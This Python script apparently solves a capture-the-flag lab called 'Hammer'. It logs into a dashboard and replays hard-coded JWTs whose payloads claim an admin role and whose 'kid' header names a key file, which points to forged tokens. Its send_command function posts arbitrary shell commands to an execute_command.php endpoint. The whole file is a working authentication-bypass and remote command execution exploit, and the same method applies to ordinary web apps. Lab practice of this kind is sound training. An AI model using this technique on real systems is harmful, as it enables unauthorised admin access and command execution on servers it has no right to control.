import requests
import json

ip = "10.10.246.147"
def test_token(jwt, sessid):
    session = requests.session()
    url = f"http://{ip}:1337/dashboard.php"
    post_data = {
        "email": "tester@hammer.thm",
        "password": "meow"
    }
    post_req = session.post(url, data=post_data)
    
    cookies = {
        "token": jwt,
        "PHPSESSID": post_req.cookies["PHPSESSID"]
    }
    res = session.get(url, cookies=cookies)
    print(res.text)
    

def send_command(command):
    jwt_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjE4OGFkZTEua2V5In0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM0MTc5MTA5LCJleHAiOjE3MzQxODI3MDksImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.aU36lSCeeeVoMSlKKMXffk3NYOHHmklHLt2FZHCX33M"

    url = f'http://{ip}:1337/execute_command.php'
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'Content-Type': 'application/json'
    }
    data = json.dumps({"command": command})

    response = requests.post(url, headers=headers, data=data)
    print(response.text)

if __name__ == "__main__":
    jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjE4OGFkZTEua2V5In0.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzM0MjAxMDcwLCJleHAiOjE3MzQyMDQ2NzAsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.1P2CYcWyvE0KZuTZDDFe2sRkbOlCoTPQjO79w15x1Jc"
    php_sessid = "20goq2rm0fgcdkgeqenrq1pein"
    
    test_token(jwt, php_sessid)